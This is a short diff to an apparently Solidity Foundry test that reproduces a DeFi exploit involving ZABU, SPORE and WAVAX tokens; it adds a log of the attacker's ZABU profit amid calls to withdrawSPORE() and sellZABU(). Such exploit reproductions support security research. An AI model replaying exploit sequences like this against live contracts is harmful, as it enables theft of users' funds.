@@ -108,8 +108,16 @@ contract ContractTest is DSTest{
         cheats.roll(block.number + 1001);
         (bool success1, ) = addressContract.call(abi.encodeWithSignature("withdrawSPORE()"));
         require(success1);
+
+        emit log_named_decimal_uint(
+            "Attacker ZABU profit after exploit",
+            ZABU.balanceOf(addressContract),
+            18
+        );
+
         (bool success2, ) = addressContract.call(abi.encodeWithSignature("sellZABU()"));
         require(success2);
+
 
         emit log_named_decimal_uint(
             "Attacker WAVAX profit after exploit",
